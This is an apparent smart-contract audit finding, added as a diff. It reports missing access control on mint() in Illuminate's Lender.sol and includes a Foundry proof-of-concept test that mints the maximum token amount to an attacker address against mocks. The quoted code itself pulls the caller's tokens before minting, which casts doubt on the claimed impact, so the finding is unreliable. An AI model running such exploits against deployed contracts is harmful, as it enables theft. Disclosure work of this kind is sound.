@@ -1,0 +1,94 @@
+# [H] Any external users can mint any amount of the Illuminate principal tokens due to lack of validations on mint() function in the Lender.sol
+
+## Summary
+Severity: High
+Reporter: 0xmuxyz
+Source: https://github.com/sherlock-audit/2022-10-illuminate/blob/main/src/Lender.sol#L270-L288
+Type: audit-issue
+
+## Details
+# Any external users can mint any amount of the Illuminate principal tokens due to lack of validations on mint() function in the Lender.sol
+
+## Summary
+- Any external users can `mint` any amount of the Illuminate principal tokens due to lack of validations on `mint()` function in the Lender.sol.
+
+## Vulnerability Detail
+- Lack of validations on `mint()` function that allow any external users to be able to mint any amount of the Illuminate principal tokens (Illuminate's ERC5095 tokens).
+
+## Impact
+- There is no validations such as `access control modifiers` on `mint()` function in the Lender.sol.
+   - As a result, any external users can mint any amount of the Illuminate principal tokens (Illuminate's ERC5095 tokens) directly via calling `mint()` function directly. 
+     - This lead to an exploit that give large fixed-rate positions to malicious attackers (attacker's wallet or attacker's contract) without lending proper amount of underlying tokens.
+
+## Code Snippet (include PoC)
+- This vulnerability is at the line of `mint()` function in the Lender.sol.
+  - As we can see code snippet below, there is no validations such as access control modifiers on `mint()` function.
+https://github.com/sherlock-audit/2022-10-illuminate/blob/main/src/Lender.sol#L270-L288
+```solidity
+    function mint(
+        uint8 p,
+        address u,
+        uint256 m,
+        uint256 a
+    ) external unpaused(u, m, p) returns (bool) {
+        // Fetch the desired principal token
+        address principal = IMarketPlace(marketPlace).token(u, m, p);
+
+        // Transfer the users principal tokens to the lender contract
+        Safe.transferFrom(IERC20(principal), msg.sender, address(this), a);
+
+        // Mint the tokens received from the user
+        IERC5095(principalToken(u, m)).authMint(msg.sender, a);
+
+        emit Mint(p, u, m, a);
+
+        return true;
+    }
+```
+↓
+- **PoC**：https://github.com/sherlock-audit/2022-10-illuminate-masaun/tree/PoC_exploit_mint-method/test/exploit
+   (Code of test exploit of `mint()` method：https://github.com/sherlock-audit/2022-10-illuminate/blob/main/test/exploit/LenderExploit.t.sol#L151-L173 )
+```solidity
+    //@dev - This is a vulnerability that anyone can mint iPTs (the Illuminate Principal Tokens)
+    //@dev - Below is a PoC of exploit of Lender#mint()
+    function testExploit_mint() public {
+        //@dev - Create a EOA address of an attacker
+        address ATTACKER = makeAddr("attacker");
+
+        //@dev - Set the attacker's EOA address as a caller
+        vm.startPrank(ATTACKER);
+
+        //@dev - Mint iPTs to the attacker's EOA address
+        uint8 p = 1;
+        address u = underlying;  // Mock underlying token (ERC20)
+        uint256 m = 1;
+        //uint256 a = 1;                // Minted-amount is 1
+        uint256 a = type(uint256).max;  // Minted-amount is max amount
+        bool resultOfMint = l.mint(p, u, m, a);
+        assertEq(resultOfMint, true);
+
+        vm.stopPrank();
+
+        //@dev - Check the result whether max amount of iPTs are minted to the attacker's EOA address or not
+        uint iptBalanceAfterExploit = ipt.mintCalled(ATTACKER);
+        console.log("iPT balance of the attacker's EOA address (after this exploit):", iptBalanceAfterExploit);
+        assertEq(iptBalanceAfterExploit, a);
+    }
+```
+
+   ↓
+   - Result of **PoC** above：
+      - At first, we can see that an attacker's EOA address `mint` max amount of iPTs. (= 115792089237316195423570985008687907853269984665640564039457584007913129639935)
+      - Finally, we can confirm that the iPT balance of an attacker's EOA address after exploit is max amount of iPTs. (by using `IlluminatePrincipalToken#mintCalled()` method)
+         <img width="1434" alt="Screen Shot 2022-10-30 at 17 47 43" src="https://user-images.githubusercontent.com/19357502/198870198-5c38fa51-8a72-47ef-9993-36a69f4c6f95.png">
+
+<br>
+
+## Tool used
+- Manual Review in Foundry
+
+## Recommendation
+- Should implement the [Role-Based Access Control](https://docs.openzeppelin.com/contracts/4.x/access-control#role-based-access-control) in order to mitigate this vulnerability. 
+   - For example, using the [Access Control module](https://docs.openzeppelin.com/contracts/4.x/access-control#using-access-control) provided by @openzeppelin/contracts is better to manage access rights of each users.
+      - Using `onlyRole()` modifier and `hasRole()` function of @openzeppelin/contracts are useful in order to check whether a caller (msg.sender) of mint() function is the caller who has proper role or not. 
+         https://docs.openzeppelin.com/contracts/4.x/access-control#using-access-control
